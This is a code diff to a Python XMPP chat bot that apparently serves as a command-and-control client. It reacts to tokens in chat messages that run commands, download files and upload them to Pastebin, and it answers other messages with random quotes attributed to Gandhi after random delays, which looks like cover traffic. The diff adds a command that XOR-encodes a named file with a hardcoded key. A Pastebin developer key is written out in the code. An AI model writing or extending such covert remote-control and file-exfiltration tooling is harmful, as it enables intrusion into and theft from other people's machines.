@@ -21,6 +21,7 @@ USERNAME = 'example@gmail.com'
 CMD_TOKEN = '$'
 DWNLD_TOKEN = '!'
 UPLD_TOKEN = '^'
+XOR_TOKEN = '%'
 
 SERVICE_DISCOVERY = 'xep_0030'
 MULTIUSER_CHAT = 'xep_0045'
@@ -28,6 +29,9 @@ XMPP_PING = 'xep_0199'
 
 #Pastebin varriables
 devkey = "6c71766cdadff9f33347e80131397ac2"
+
+##xor_var bytes are currently hardcoded
+xor_var = bytearray([0xde,0xad,0x13,0x37])
 
 #Gandhi Version 
 MESSAGES = ['I fear no one on Earth.', 'I follow God.', 'I bear no ill will toward anyone.', 'I will not submit to injustice.', 'I will conquer untruth with truth.', 'I will put up with suffering.', 'Be the change you wish to see.', 'My life is my message', 'Live as though you would die today.', 'Learn as though you would live forever.',]
@@ -88,6 +92,13 @@ class MUCBot(sleekxmpp.ClientXMPP):
         reply = self.upload(body.lstrip(UPLD_TOKEN))
         msg.reply("file posted to: "+reply).send()
         return
+      #Execute and respond to the %xor instruction  
+      if body and body[0] == XOR_TOKEN:
+        file_name = format(body.lstrip(XOR_TOKEN).split('/')[-1])
+        self.xor(file_name, xor_var, file_name+".new")
+        msg.reply("file saved as "+file_name+".new").send()
+        return
+      #Default response if no special tokens were given
       time.sleep(random.uniform(0.4, 2.45))
       reply = random.choice(MESSAGES)
       msg.reply(reply).send()
@@ -143,6 +154,17 @@ class MUCBot(sleekxmpp.ClientXMPP):
         exit(2)
       else:
         return reply
+
+  def xor(self, orginal_file, xor_var, new_file):
+    l = len(xor_var)
+    data = bytearray(open(orginal_file, 'rb').read())
+    result = bytearray((
+      (data[i] ^ xor_var[i % l]) for i in range(0,len(data))
+    ))
+    localFile = open(new_file, 'w')
+    localFile.write(result)
+    localFile.close()
+    return
 
 
 def main():
